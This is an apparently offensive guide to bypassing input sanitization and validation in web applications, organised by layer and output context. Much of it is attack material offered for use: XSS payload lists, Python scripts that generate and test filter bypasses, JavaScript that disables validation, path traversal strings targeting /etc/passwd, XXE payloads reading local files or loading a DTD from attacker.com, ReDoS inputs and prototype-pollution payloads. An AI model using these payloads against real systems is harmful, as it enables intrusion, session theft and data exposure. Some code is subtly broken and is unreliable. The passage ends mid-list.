# Sanitization & Validation Bypass

A comprehensive methodology for detecting, analyzing, and bypassing input sanitization and validation controls across the entire application stack. This is the foundational skill for finding XSS, SQLi, SSTI, command injection, file upload, and path traversal vulnerabilities in modern web applications.

## Table of Contents

1. [Sanitization Fundamentals](#sanitization-fundamentals)
2. [Client-Side Sanitization](#client-side-sanitization)
3. [Server-Side Input Validation](#server-side-input-validation)
4. [Output Encoding Analysis](#output-encoding-analysis)
5. [Filter Evasion Catalog](#filter-evasion-catalog)
6. [Sanitization Bypass by Vulnerability Class](#sanitization-bypass-by-vulnerability-class)
7. [Multi-Layer Sanitization Testing](#multi-layer-sanitization-testing)
8. [Normalization Attacks](#normalization-attacks)
9. [Bypass Automation](#bypass-automation)
10. [Checklist](#checklist)

---

## Sanitization Fundamentals

### Where Sanitization Happens

Input sanitization can occur at multiple layers of the application stack. Each layer has different detection methods and bypass approaches.

#### Layer 1: Client-Side (Browser) Validation

```javascript
// Inline JS validation
function validateInput(input) {
    if (input.includes('<script>')) {
        alert('Invalid input');
        return false;
    }
    return true;
}

// HTML5 constraint validation
<input type="text" pattern="[a-zA-Z0-9]+" required maxlength="50">

// Framework validation (React, Angular, Vue)
const schema = yup.string().matches(/^[a-z0-9]+$/).max(50);
```

**Detection:** Look for validation logic in page source, JS bundles, or framework-specific attributes (`pattern`, `maxlength`, `required`, `ng-pattern`, `v-model` modifiers).

**Bypass:** Intercept with Burp Suite before validation runs. Client-side validation is purely cosmetic from a security perspective.

#### Layer 2: Server-Side Middleware

```python
# Express middleware
app.use(express.json({ limit: '10kb' }));
app.use(helmet());
app.use(xssClean());
app.use(validator());

# Django middleware
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'xss_cleaner.middleware.XSSCleanMiddleware',
]

# Custom middleware
class SanitizationMiddleware:
    def process_request(self, request):
        for key, value in request.POST.items():
            request.POST[key] = self.sanitize(value)
```

**Detection:** Check response headers for framework signatures, test with payloads that trigger different responses between raw vs processed requests.

**Bypass:** Find endpoints not covered by middleware (different content types like JSON, multipart, GraphQL queries that bypass REST middleware).

#### Layer 3: Application/Business Logic

```python
# View-level validation
def create_document(request):
    title = request.POST.get('title')
    if not title or len(title) > 100:
        return HttpResponseBadRequest()
    if any(c in title for c in '<>{}'):
        return HttpResponseBadRequest()
    doc = Document(title=sanitize_html(title))
    doc.save()

# Service-level validation
class DocumentService:
    def create(self, user, data):
        if not self._validate(data):
            raise ValidationError()
        return self.repository.save(self._sanitize(data))
```

**Detection:** Send different inputs to the same parameter and compare responses for rejection vs acceptance patterns.

**Bypass:** Test encoding mismatches, find bypasses in the specific sanitization function used.

#### Layer 4: Database Layer (ORM/Stored Procedures)

```sql
-- Parameterized queries (safe)
SELECT * FROM users WHERE id = ?;

-- Stored procedure with validation
CREATE PROCEDURE create_user(
    @username NVARCHAR(50),
    @email NVARCHAR(255)
)
AS
BEGIN
    IF @username LIKE '%[<>]%'
        THROW 50000, 'Invalid username', 1;
    INSERT INTO users (username, email) VALUES (@username, @email);
END

-- Database-level triggers
CREATE TRIGGER sanitize_input
ON documents
INSTEAD OF INSERT
AS
BEGIN
    INSERT INTO documents (title, content)
    SELECT REPLACE(REPLACE(title, '<', '&lt;'), '>', '&gt;'),
           REPLACE(REPLACE(content, '<', '&lt;'), '>', '&gt;')
    FROM inserted;
END
```

**Detection:** Exception messages that reference database constraints, error codes, or trigger names.

**Bypass:** Null byte injection to truncate before trigger validation, encoding mismatches between app and DB.

#### Layer 5: Output Encoding

```python
# Template-level encoding
{{ user_input }}  →  Jinja2 auto-escapes HTML
{% autoescape false %} {{ user_input }} {% endautoescape %}  →  No encoding

# Manual encoding
from markupsafe import escape
output = escape(user_input)

# Response headers
Content-Type: text/html; charset=utf-8
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
```

**Detection:** Compare raw input vs rendered output. Auto-escaped templates will show `&lt;` instead of `<`.

**Bypass:** Context confusion — a template that auto-escapes for HTML context may not escape for JavaScript or CSS context.

### Why Client-Only Sanitization Is Common and Exploitable

Client-only sanitization is one of the most common vulnerabilities in web applications. It happens because:

1. **Developer time pressure:** "It works in my browser, ship it."
2. **UX priority:** Quick feedback loops for users without round-trips.
3. **False sense of security:** "We validated the input, it's safe."
4. **API-first with lazy backend:** Frontend team builds validation, backend team never adds it.

```javascript
// Real-world example: client-only validation
function sanitizeURL(url) {
    return url.replace(/[<>"']/g, '');
}

// This runs only in the browser. Direct API calls skip it entirely.
// POST /api/profile {"website": "javascript:alert(1)"}
// → Server stores raw value, renders unsanitized on profile page.
```

**The exploit path is always the same:**
1. Find the client-side validation logic.
2. Send requests directly to the API (Burp, curl, Python).
3. If server doesn't re-validate, your payload is stored.
4. Trigger the stored payload (render, email, export).

---

## Client-Side Sanitization

### Detecting JS Validation

#### Method 1: Pattern Attribute Inspection

```html
<!-- HTML5 validation patterns reveal server-side expectations -->
<input name="username" pattern="[a-zA-Z0-9_]{3,20}" maxlength="20">
<input name="email" type="email">
<input name="phone" pattern="[\+]?[0-9]{10,15}">
```

**What to look for:**
- `pattern` attribute — reveals expected regex format
- `maxlength` — reveals truncation point
- `required` — reveals mandatory fields
- `type` — reveals expected input type (email, url, number)

#### Method 2: JavaScript Bundle Analysis

Search JS bundles for validation functions:

```bash
grep -r "function.*valid" *.js
grep -r ".includes\|.match\|.test\|.replace" *.js
grep -r "sanitize\|clean\|escape\|filter" *.js
```

Common validation function patterns:

```javascript
// Pattern 1: Function-level validation
function sanitizeName(name) {
    return name.replace(/[<>]/g, '');
}

// Pattern 2: Regex test then return
function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Pattern 3: Blacklist-based
function isSafe(input) {
    const bad = ['<script>', 'onerror=', 'javascript:'];
    return !bad.some(b => input.includes(b));
}

// Pattern 4: Framework validation schema
const schema = {
    username: value => /^[a-z0-9]+$/i.test(value) && value.length <= 30,
    bio: value => sanitizeHtml(value),
    website: value => validator.isURL(value)
};

// Pattern 5: Hidden validation in event handlers
$('#submit').click(function(e) {
    if (!validateForm()) {
        e.preventDefault();
        return false;
    }
});
```

#### Method 3: Network Interception

Use Burp Suite to identify validation:

1. Submit a valid form, capture the request.
2. Submit an invalid form, capture the request.
3. Compare — if the invalid request never reaches the server, validation is client-only.

```
[Browser] → [Client Validation] → [Server]
                                  ↑
Valid request:    POST /api/data {"name": "John"}           → 200 OK
Invalid request:  POST /api/data {"name": "<script>alert(1)</script>"}  → Never sent
Direct API call:  POST /api/data {"name": "<script>alert(1)</script>"}  → 200 OK (stored!)
```

### Bypassing with Burp/Proxy

Always test against the server directly, not through the browser:

```bash
# Step 1: Capture a legitimate request in Burp
# Step 2: Send to Repeater
# Step 3: Modify payload beyond client-side validation
# Step 4: Send directly (bypasses all browser-side checks)

curl -X POST https://target.com/api/profile \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name": "<img src=x onerror=alert(1)>", "bio": "<script>alert(1)</script>"}'
```

**Key insight:** If the server responds with 200 OK and the payload is stored, the client validation was the only barrier.

### Disabling JS Checks

When testing within a browser context (e.g., DOM-based XSS):

```javascript
// Disable form validation globally
document.querySelectorAll('form').forEach(f => f.noValidate = true);

// Remove pattern attributes
document.querySelectorAll('[pattern]').forEach(el => el.removeAttribute('pattern'));

// Remove maxlength
document.querySelectorAll('[maxlength]').forEach(el => el.removeAttribute('maxlength'));

// Override validation functions
HTMLFormElement.prototype.checkValidity = () => true;
HTMLInputElement.prototype.checkValidity = () => true;

// Intercept and remove event listeners
const originalAdd = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, handler, options) {
    if (type === 'submit' || type === 'click' || type === 'input') return;
    return originalAdd.call(this, type, handler, options);
};
```

### Identifying API Endpoints That Skip Client Validation

Modern SPAs often have a single validation function but multiple API endpoints. Find the endpoints that the validation function DOESN'T cover:

```javascript
// Validation only covers the main form
const api = {
    updateProfile: (data) => post('/api/profile', data),        // Validated
    uploadAvatar: (file) => post('/api/avatar', file),           // Validated
    updateSettings: (data) => post('/api/settings', data),       // NOT validated
    addPaymentMethod: (data) => post('/api/payment', data),      // NOT validated
    saveDraft: (data) => post('/api/drafts', data),              // NOT validated
    importContacts: (data) => post('/api/import', data),         // NOT validated
};
```

**Testing methodology:**

1. Map all API endpoints (Swagger, HAR files, JS bundle analysis, traffic replay).
2. For each endpoint, send a malicious payload.
3. If the server accepts it without re-validation, you found a bypass.

### Chrome DevTools Debugging Workflow

Set breakpoints on validation functions to understand what's being blocked:

```javascript
// Step 1: Open DevTools → Sources tab
// Step 2: Ctrl+Shift+F and search for validation function names
// Step 3: Set breakpoints inside validation functions
// Step 4: Trigger validation by submitting forms
// Step 5: Inspect the input value at breakpoint
// Step 6: Step through the validation logic
// Step 7: Modify local variables to bypass checks
// Step 8: Continue execution
```

**DevTools Console commands for bypassing validation:**

```javascript
// Override the validation function at runtime
window.validateInput = function(input) { return true; };
window.isValid = function(input) { return true; };
window.sanitize = function(input) { return input; };

// Call the API directly from console bypassing all UI validation
fetch('/api/profile', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({name: '<script>alert(1)</script>'})
});

// Find and call validation-adjacent API functions
Object.keys(window.__API__ || {})
    .filter(k => k.includes('update') || k.includes('save') || k.includes('create'))
    .forEach(k => console.log(k, window.__API__[k]));
```

### Rewriting JS to Expose Hidden Validation Logic

Minified JS bundles often contain inline validation. Deobfuscate and rewrite:

```javascript
// Minified original
function v(e){return e.replace(/<script>/gi,'').replace(/on\w+=/gi,'')}

// Deobfuscated
function validateAndSanitize(input) {
    return input
        .replace(/<script>/gi, '')      // Removes <script> tags
        .replace(/on\w+=/gi, '');       // Removes event handlers
}

// What it misses:
// <ScRiPt>alert(1)</ScRiPt>     → case bypass
// <scr<script>ipt>               → tag splitting
// <img src=x onerror=alert(1)>   → event handler in different position
// <svg onload=alert(1)>          → different tag
// <body onload=alert(1)>         → different tag
// javascript:alert(1)            → protocol handler
```

**Systematic bypass approach:**

1. Extract the regex patterns from the minified code.
2. For each pattern, apply the common bypass techniques.
3. Test each bypass against the live endpoint.

```python
def generate_bypasses(sanitizer_regex):
    """Given a sanitizer regex, generate bypass payloads."""
    bypasses = []

    # If blacklist-based, try:
    bypasses.extend([
        # Case variation
        input.replace('<script>', '<ScRiPt>'),
        input.replace('<script>', '<SCRIPT>'),
        # Tag splitting
        input.replace('<script>', '<scr<script>ipt>'),
        # Encoding
        input.replace('<script>', '&#60;script&#62;'),
        input.replace('<script>', '\\x3Cscript\\x3E'),
        # Unicode
        input.replace('<script>', '\\u003Cscript\\u003E'),
        # Null byte
        input.replace('<script>', '<scr\0ipt>'),
        # Newline
        input.replace('<script>', '<scr\nipt>'),
        # Different tag entirely
        input.replace('<script>alert(1)</script>', '<img src=x onerror=alert(1)>'),
        input.replace('<script>alert(1)</script>', '<svg onload=alert(1)>'),
        input.replace('<script>alert(1)</script>', '<body onload=alert(1)>'),
    ])

    return bypasses
```

---

## Server-Side Input Validation

### Blacklist vs Whitelist

Understanding the validation strategy determines how you bypass it.

| Strategy | Definition | Example | Bypass Likelihood |
|----------|-----------|---------|-------------------|
| Blacklist | Block known bad patterns | `block(['<script>', 'onerror='])` | High — you just need an unlisted pattern |
| Whitelist | Allow only known good patterns | `allow(/^[a-z0-9]+$/)` | Low — much harder to bypass |
| Hybrid | Whitelist structure, blacklist content | `allow(/^[a-z0-9@.]+$/)` then `block(['DROP', 'UNION'])` | Medium |

#### Blacklist Bypass Methodology

```python
def test_blacklist(endpoint, param, base_payload):
    """Test blacklist against a parameter."""
    payloads = [
        # Case variation
        base_payload.upper(),
        base_payload.lower(),
        base_payload.replace('s', 'S').replace('c', 'C'),

        # Encoding
        quote(base_payload, safe=''),
        base_payload.encode('utf-16').decode('latin-1'),

        # Character insertion
        base_payload.replace('script', 'scr\x00ipt'),
        base_payload.replace('script', 'scr\nipt'),
        base_payload.replace('script', 'scr\tipt'),

        # Unusual variations
        base_payload.replace('<', '\\x3C'),
        base_payload.replace('<', '\\u003C'),

        # Decomposed characters (NFD)
        unicodedata.normalize('NFD', base_payload),
    ]

    for payload in payloads:
        r = requests.post(endpoint, data={param: payload})
        if r.status_code == 200 and payload_in_response(payload, r):
            return f"Bypass found: {payload}"
    return "No bypass found"
```

#### Whitelist Bypass Methodology

Whitelists are harder to bypass but have specific weaknesses:

```python
# Whitelist allowing only alphanumeric + underscore
# Weakness 1: Length limit bypass
whitelist = re.compile(r'^[a-zA-Z0-9_]+$')

# What if the whitelist doesn't account for multi-value parameters?
# Param[] becomes an array
user_name[]=value1&user_name[]=<script>alert(1)</script>

# What if the whitelist is only checked for one content type?
# JSON content-type bypasses form-based validation
POST /api/profile  (Content-Type: application/json)
{"name": "<script>alert(1)</script>"}  # Bypasses form whitelist

# What if the whitelist is applied to decoded data but not URL-encoded data?
POST /api/profile  (Content-Type: application/x-www-form-urlencoded)
name=%3Cscript%3Ealert(1)%3C%2Fscript%3E  # May be decoded after whitelist check
```

### Regex Flaws

Regex-based validation has specific exploitable patterns:

#### Pattern 1: Missing Anchor

```python
# Vulnerable — matches anywhere in string
blacklist = re.compile(r'<script>', re.IGNORECASE)
# Matches: '<script>' in 'xxx<script>yyy'
# Doesn't match: '<script >', '<scr\nipt>', '<<script>'

# More vulnerable — no start/end anchors
whitelist = re.compile(r'^[a-z]+@[a-z]+\.[a-z]+$')
# This IS properly anchored
```

**The issue:** Without `^` and `$` anchors, a regex checks for a SUBSTRING match, not a full string match.

#### Pattern 2: Backtracking (ReDoS)

Some regex patterns have exponential backtracking:

```python
# Vulnerable to ReDoS
re.compile(r'^(\w+)*$')            # (/w+)* causes catastrophic backtracking
re.compile(r'^(a|aa)+$')           # (a|aa)+ causes exponential backtracking
re.compile(r'^(\d+|\w+)+$')        # Nested quantifiers
re.compile(r'^<(\w+).*</\1>$')     # Backreference with .*

# Input that triggers timeout:
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
# Server hangs for seconds/minutes — disables the validation entirely
```

**Exploitation:** Send a ReDoS payload to timeout the validation, then send the real payload on a different parameter or in the same request.

#### Pattern 3: Incomplete Character Class

```python
# Only blocks standard angle brackets
blacklist = re.compile(r'[<>]')

# But allows:
# Unicode brackets: \u276C \u276D  (❬ ❭)
# Fullwidth brackets: \uFF1C \uFF1E  (＜ ＞)
# Mathematical brackets: \u27E8 \u27E9  (⟨ ⟩)
# Invisible brackets: \u2061 \u2062
```

#### Pattern 4: Case Sensitivity Mismatch

```python
# Python defaults to case-sensitive
blacklist = re.compile(r'<script>')  # Doesn't match <SCRIPT>, <Script>

# Developer adds IGNORECASE
blacklist = re.compile(r'<script>', re.IGNORECASE)  # Now catches all variants

# But what about mixed case?
# <sCrIpT> — still matches with IGNORECASE
# What about HTML entity encoding?
# &#60;script&#62; — not matched by either!
```

#### Pattern 5: Dot-All Mode Not Set

```python
# Default: `.` doesn't match newlines
blacklist = re.compile(r'<script>.*</script>')
# DOESN'T match:
# <script>
# alert(1)
# </script>

# Fix: re.compile(r'<script>.*</script>', re.DOTALL)
```

### Length Restrictions Before Validation

Some applications apply length restrictions BEFORE validation, creating a bypass:

```python
# Vulnerable pattern
def process_input(user_input):
    # Step 1: Truncate before validation
    truncated = user_input[:50]

    # Step 2: Validate the truncated version (passes for short payloads)
    if not re.match(r'^[a-zA-Z0-9]+$', truncated):
        return "Invalid"

    # Step 3: Store the ORIGINAL (untruncated) input
    db.save(user_input)
    # The stored value is longer and may contain malicious characters!
```

**The exploit:**
```
Send: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>alert(1)</script>"
Truncated to 50: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"  ← passes validation
Stored: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>alert(1)</script>"  ← full payload
```

### Type Coercion Issues

Type coercion can bypass strict validation:

```python
# PHP — loose type comparison
if ($input != "") {          // != vs !==
    $clean = sanitize($input);
    echo $clean;
}
// Input: 0  →  0 != "" is false (0 == "") → bypasses sanitization

# JavaScript — NaN bypass
if (typeof input === 'string' && input.length > 0) {
    // Input: []  →  typeof [] is 'object', not 'string' → bypasses
    // Input: NaN  →  typeof NaN is 'number', not 'string' → bypasses
}

# Python — boolean coercion
if input:
    sanitized = sanitize(input)
# Input: False or 0 or [] or {}  →  all evaluate to False → bypasses
```

**Testing type coercion:**

```python
def test_type_coercion(endpoint, param):
    payloads = [
        None,                 # Null
        True,                 # Boolean
        False,                # Boolean
        0,                    # Integer zero
        1,                    # Integer
        0.0,                  # Float
        [],                   # Empty array
        [1, 2, 3],            # Array
        {},                   # Empty object
        {"a": 1},             # Object
        "0",                  # String "0" (falsey in PHP)
        "",                   # Empty string
    ]
    for payload in payloads:
        r = requests.post(endpoint, json={param: payload})
        print(f"{repr(payload)} → {r.status_code}: {r.text[:100]}")
```

### Multi-Byte Character Flaws

Applications that handle multi-byte encodings (UTF-8, Shift-JIS, GBK) can be vulnerable to encoding-specific bypasses:

```python
# PHP + GBK encoding — classic addslashes bypass
# addslashes() adds a backslash before single quotes
# In GBK: \xbf\x27 is a valid multibyte character
# \xbf\x5c\x27 → \xbf is the start, \x5c is the second byte of GBK char
# \x5c is the backslash! So addslashes turns ' into \'
# But \xbf\x5c is one GBK character
# So \xbf' → addslashes → \xbf\' → GBK parser reads \xbf\ as one char → ' is unescaped!

# Python + UTF-8 — overlong encoding
# Valid UTF-8: < = 0x3C
# Overlong UTF-8: < = 0xC0 0xBC (2-byte encoding of ASCII)
# Some decoders accept overlong sequences, some don't
# If validator checks for 0x3C but decoder accepts 0xC0 0xBC → bypass
```

**Multi-byte bypass patterns:**

| Encoding | Payload | Bypasses |
|----------|---------|----------|
| GBK/CP936 | `%bf%27` | Addslashes/quote_escape |
| Shift-JIS | `%81%5C` | Backslash escaping |
| EUC-JP | `%a1%5c` | Backslash escaping |
| UTF-8 overlong | `%C0%BC` instead of `<` | Simple character filter |
| UTF-8 overlong | `%C0%AE` instead of `.` | Path traversal filter |
| UTF-16 | `<` as `\x00<\x00` | ASCII-based filters |
| UTF-7 | `+ADw-script+AD4-` | ASCII-based filters (rare) |

### Truncation Before Validation Bugs

Similar to length restrictions, but the truncation happens at a database level:

```sql
-- MySQL VARCHAR(20) column
-- Input: "aaaaaaaaaaaaaaaaaaaa<script>alert(1)</script>"
-- MySQL silently truncates to first 20 chars: "aaaaaaaaaaaaaaaaaaaa" (valid)
-- BUT if the application validates first, then truncation happens in DB:
-- Validated: "<script>alert(1)</script>" → rejected by validator
-- BUT what if we pad to exactly truncation boundary?
-- "aaaaaaaaaaaaaaaaaaa<script>alert(1)</script>" → 20 chars
-- Truncated to: "aaaaaaaaaaaaaaaaaaa<scri" → valid!
```

**The exploit vector:**
1. Find the max length of a column (error messages often reveal this: `Data too long for column 'name'`).
2. Pad your payload to exactly fit in the column.
3. The truncated version stored in DB is \
padding + partial payload — if the partial is still executable (e.g., `<img src=x onerror=alert(1)>` truncated to `<img src=x onerror=alert(` — not useful).

**Better approach:** Find columns that truncate AFTER the dangerous part:
```
Column: VARCHAR(100)
Payload: "A" * 95 + "<script>alert(1)</script>"  → 107 chars
Stored: "A" * 95 + "<script>alert(1)</sc"  → Not exploitable directly
```

But if the stored value is displayed without escaping in an email or admin panel, even partial HTML can be useful:
```
"A" * 95 + "<img src=x onerror=alert(1)>"  → stored as first 100 chars
```

### Encoding Mismatch (Server Decodes Differently Than It Validates)

This is the most common server-side sanitization bypass:

```python
# Validation layer
def validate_input(data):
    # Validates URL-decoded input
    input = urllib.parse.unquote(data)
    if '<' in input or '>' in input:
        return False
    return True

# Processing layer (different component)
def process_input(data):
    # Decodes again! (double decode)
    decoded = urllib.parse.unquote(data)  # or data = data.decode('utf-8')
    # Now original encoded chars are decoded

# The bypass:
# Send: %253Cscript%253E
# Validation layer unquotes once: %3Cscript%3E  (no < or > → passes)
# Processing layer unquotes again: <script> (bypasses!)

# OR: different encoding at each layer
# Validation: checks for ' and " (SQL injection prevention)
# Database: expects UTF-16
# Send: \x00'  (null byte + quote)
# Validation: '\x00\'' → doesn't detect ' alone (it's part of \x00')
# Database: interprets as quote
```

**Testing for encoding mismatches:**

| Layer 1 Encode | Layer 2 Encode | Payload | Expected Result |
|----------------|----------------|---------|-----------------|
| `urllib.parse.unquote_once` | `urllib.parse.unquote` | `%25252F` | Double decode bypass |
| `html.unescape` | `html.unescape` | `&amp;lt;` | Entity double-decode |
| `unquote_plus` | `unquote` | `%2B` | Plus-sign mismatch |
| UTF-8 decode | UTF-8 decode | Overlong `%C0%BC` | Overlong bypass |
| URL decode | Base64 decode | Base64 of `<script>` | Content-type mismatch |
| JS `decodeURI` | Python `unquote` | `%u003C` | Unicode escape mismatch |

---

## Output Encoding Analysis

Output encoding must match the context where the data is rendered. Mismatched encoding is the root cause of most XSS and injection vulnerabilities.

### HTML Context (Entity Encoding)

Data rendered between HTML tags:

```html
<div>USER_INPUT</div>
<p>USER_INPUT</p>
<span>USER_INPUT</span>
```

**Correct encoding:** Convert `<`, `>`, `&`, `"`, `'` to HTML entities.

```python
import html
safe = html.escape(user_input)
# <  →  &lt;
# >  →  &gt;
# &  →  &amp;
# "  →  &quot;
# '  →  &#x27;
```

**Testing payloads for HTML context:**

```html
<!-- Standard XSS -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Entity encoding bypass (if not encoded) -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Multi-encoding bypass (if decoded) -->
&amp;lt;script&amp;gt;

<!-- Newline/space injection -->
<scr\nipt>alert(1)</script>
<script >alert(1)</script>

<!-- Attribute within HTML -->
<div>"><script>alert(1)</script></div>
```

### Attribute Context (Attribute Breaking)

Data rendered inside HTML attributes:

```html
<input value="USER_INPUT">
<a href="USER_INPUT">
<img src="USER_INPUT">
<div class="USER_INPUT">
```

**Correct encoding:** Quote all attribute values, escape `"`, `&`, `<`, `>`, and especially avoid event handlers.

```python
# Wrong: Only HTML-encoding
safe_attr = html.escape(user_input)
# Still vulnerable to attribute breaking:
# user_input = " onfocus=alert(1) autofocus="
# <input value=" onfocus=alert(1) autofocus=" ">
# This breaks out of the value attribute!

# Correct: Attribute-specific encoding
def encode_attr(value):
    return value.replace('&', '&amp;') \
                .replace('"', '&quot;') \
                .replace('<', '&lt;') \
                .replace('>', '&gt;') \
                .replace("'", '&#x27;') \
                .replace(' ', '&#x20;')  # Prevent attribute splitting
```

**Testing payloads for attribute context:**

```html
<!-- Break out of quoted attribute -->
"><script>alert(1)</script>
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
" autofocus onfocus=alert(1) x="

<!-- Break out of unquoted attribute -->
 onfocus=alert(1) autofocus=
/ onerror=alert(1)/
 onclick=alert(1)

<!-- Href-specific payloads -->
javascript:alert(1)
javascript:alert(1);//
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- Event handler injection (if encoding is partial) -->
"onclick="alert(1)
"onfocus=alert(1) autofocus"
"onmouseover=alert(1)""

<!-- SVG attribute injection -->
" onload=alert(1) "
" onerror=alert(1) "
```

### JavaScript Context (String Escaping)

Data rendered inside JavaScript:

```html
<script>
    var name = "USER_INPUT";
    var config = JSON.parse('USER_INPUT');
    element.innerHTML = "USER_INPUT";
</script>
<script src="data:USER_INPUT"></script>
```

**Correct encoding:** Escape `"`, `'`, `\`, newlines, and close script tags. Never insert untrusted data directly into JavaScript.

```python
def encode_js(value):
    return value.replace('\\', '\\\\') \
                .replace('"', '\\"') \
                .replace("'", "\\'") \
                .replace('\n', '\\n') \
                .replace('\r', '\\r') \
                .replace('\t', '\\t') \
                .replace('</', '<\\/')   # Break out of script tag
```

**Testing payloads for JavaScript context:**

```javascript
// String delimiter break
";alert(1);var x="
';alert(1);var x='

// Template literal break (ES6)
${alert(1)}
${7*7}
`;alert(1);`

// JSON.parse injection
";alert(1);"

// Script tag close (even inside JS string)
</script><script>alert(1)</script>

// URL in JS
window.location = 'javascript:alert(1)';

// eval context
eval("alert(1)");

// Function constructor
Function("alert(1)")();

// setTimeout/setInterval with string
setTimeout("alert(1)", 0);

// Regular expression injection
/alert(1)/.test(input);
```

### CSS Context (URL/Inline)

Data rendered inside CSS:

```html
<style>
    body { background: USER_INPUT; }
    .custom { font-family: "USER_INPUT"; }
</style>
<div style="background: USER_INPUT">
```

**Correct encoding:** Do not allow untrusted data in CSS at all. CSS has unique attack surfaces:

```css
/* URL injection */
background: url('USER_INPUT');
background: url("javascript:alert(1)");

/* Expression injection (IE only, legacy) */
color: expression(alert(1));

/* Custom property injection */
--x: expression(alert(1));

/* @import injection */
@import url('http://attacker.com/malicious.css');

/* Font-face URL injection */
@font-face { src: url('http://attacker.com/font.eot'); }
```

**Testing payloads for CSS context:**

```html
<!-- URL context -->
url('javascript:alert(1)')
url("javascript:alert(1)")
url(http://attacker.com/)

<!-- Expression (IE legacy) -->
expression(alert(1))
expression(document.cookie)

<!-- Custom URL schemes -->
behavior: url('http://attacker.com/xss.htc');

<!-- CSS import -->
@import 'http://attacker.com/evil.css';

<!-- Closing style tag -->
</style><script>alert(1)</script>
```

### URL Context (Path/Query Encoding)

Data rendered in URLs:

```html
<a href="USER_INPUT">
<img src="USER_INPUT">
<link href="USER_INPUT">
<form action="USER_INPUT">
```

**Correct encoding:** URL-encode the value with a whitelist approach; only allow known-safe protocols.

```python
from urllib.parse import quote

# Wrong: Only URL-encoding
safe_url = quote(user_input, safe='')

# Still allows javascript: or data: in protocol position
# user_input = "javascript:alert(1)"
# → "javascript%3Aalert%281%29"
# → href evaluates as javascript: URL

# Correct: Validate protocol first, then URL-encode
ALLOWED_PROTOCOLS = ['http', 'https', 'mailto']
def safe_url(value):
    parsed = urlparse(value)
    if parsed.scheme and parsed.scheme not in ALLOWED_PROTOCOLS:
        return '#'
    return quote(value, safe='/:?&=#')
```

**Testing payloads for URL context:**

```
// Protocol handler abuse
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:alert(1)                    // IE only
data:image/svg+xml;base64,...

// URL encoding bypass
%6A%61%76%61%73%63%72%69%70%74:alert(1)
JaVaScRiPt:alert(1)

// Newline/space before protocol
 javascript:alert(1)
\njavascript:alert(1)
\tjavascript:alert(1)

// Tab separator (browser-specific)
jav\tascript:alert(1)

// Null byte before protocol
\0javascript:alert(1)

// Protocol-less URL
//attacker.com/evil.js          // Protocol-relative URL
//@attacker.com                 // Credentials in URL

// Path traversal
../../etc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

// Unicode normalization
..%c0%ae..%c0%ae..%c0%aeetc/passwd    # Overlong UTF-8 encoding of .
..%e0%80%ae..%e0%80%aeetc/passwd      # 3-byte overlong
```

### JSON Context (String Escaping)

Data rendered in JSON responses or inline JSON:

```json
{
    "message": "USER_INPUT",
    "title": "USER_INPUT",
    "config": "USER_INPUT"
}
```

**Correct encoding:** Escape according to JSON string rules: `"`, `\`, control characters, and `</` to prevent breaking out of script blocks.

```python
import json
# Python's json.dumps handles string escaping correctly
safe = json.dumps(user_input, ensure_ascii=False)
# Escapes: ", \, \n, \r, \t, \b, \f, control chars
# Does NOT escape: <, >, & — needed for embedding in HTML
```

**Testing payloads for JSON context:**

```json
// String delimiter break
", "injected": true
", "key": "value

// Newline injection (breaks JSON if not escaped)
// Newlines in JSON strings must be escaped as \n
"line1\nline2"

// Unicode escape injection
\u0022alert(1)\u0022              // \u0022 = "

// Script tag close (for JSON in HTML context)
</script><script>alert(1)</script>

// Prototype pollution (for Node.js JSON.parse)
"__proto__": { "admin": true }

// Constructor pollution
"constructor": { "prototype": { "admin": true } }

// Nested injection
"x": { "y": "</script><script>alert(1)</script>" }
```

### XML Context (Entity Encoding)

Data rendered in XML responses:

```xml
<root>
    <name>USER_INPUT</name>
    <description>USER_INPUT</description>
</root>
```

**Correct encoding:** XML-entity-encode `<`, `>`, `&`, `"`, `'`. Pay special attention to CDATA sections.

```python
# XML entity encoding (same as HTML for these characters)
import xml.sax.saxutils
safe = xml.sax.saxutils.escape(user_input)
# <  →  &lt;
# >  →  &gt;
# &  →  &amp;
# "  →  &quot;
# '  →  &apos;
```

**Testing payloads for XML context:**

```xml
<!-- Entity injection -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<name>&xxe;</name>

<!-- CDATA injection -->
<![CDATA[<script>alert(1)</script>]]>

<!-- XML comment injection -->
<!-- <script>alert(1)</script> -->

<!-- XPath injection -->
'] | //* | //*['

<!-- XXE (XML External Entity) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Parameter entity XXE -->
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
]>

<!-- SVG XML injection -->
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(1)</script>
</svg>
```

### Testing Each Context with Specific Payloads

```python
def generate_context_payloads():
    """Generate payloads for each output encoding context."""
    return {
        'html': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
